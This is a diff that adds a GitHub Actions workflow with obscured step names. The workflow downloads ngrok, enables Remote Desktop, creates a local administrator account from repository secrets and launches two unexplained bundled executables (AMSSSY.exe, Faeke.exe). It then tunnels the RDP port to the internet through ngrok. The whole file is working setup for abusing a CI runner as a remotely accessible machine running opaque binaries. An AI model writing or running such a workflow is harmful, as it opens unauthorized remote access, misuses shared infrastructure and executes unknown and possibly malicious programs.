@@ -1,0 +1,45 @@
+name: MAY3
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+    - uses: actions/checkout@v4
+    - name: THA
+      run: Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile ngrok.zip
+    - name: GESS
+      run: Expand-Archive ngrok.zip -DestinationPath .
+    - name: GEE
+      env:
+        YY: ${{ secrets.YY }}
+      run: .\ngrok.exe authtoken "$Env:YY"
+    - name: KSME
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+    - name: UEMS
+      run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    - name: UEET
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1
+    - name: LAMA
+      shell: pwsh
+      env:
+        KY: ${{ secrets.KY }}
+        TT: ${{ secrets.TT }}
+      run: |
+        New-LocalUser -Name "$Env:KY" -Password (ConvertTo-SecureString -AsPlainText "$Env:TT" -Force) -ErrorAction SilentlyContinue
+        Set-LocalUser -Name "$Env:KY" -Password (ConvertTo-SecureString -AsPlainText "$Env:TT" -Force)
+        Add-LocalGroupMember -Group "Administrators" -Member "$Env:KY"         
+    - name: TEYE
+      run: |
+        Expand-Archive -Path "$env:GITHUB_WORKSPACE\.github\workflows\AMSSSY.zip" -DestinationPath D:\AMSSSY
+        Start-Process D:\AMSSSY\AMSSSY.exe
+    - name: MFMF
+      run: |
+        Expand-Archive -Path "$env:GITHUB_WORKSPACE\.github\workflows\Faeke.zip" -DestinationPath D:\Faeke
+        Start-Process D:\Faeke\Faeke.exe          
+    - name: MSS
+      run: .\ngrok.exe tcp 3389 --region=us-cal-1
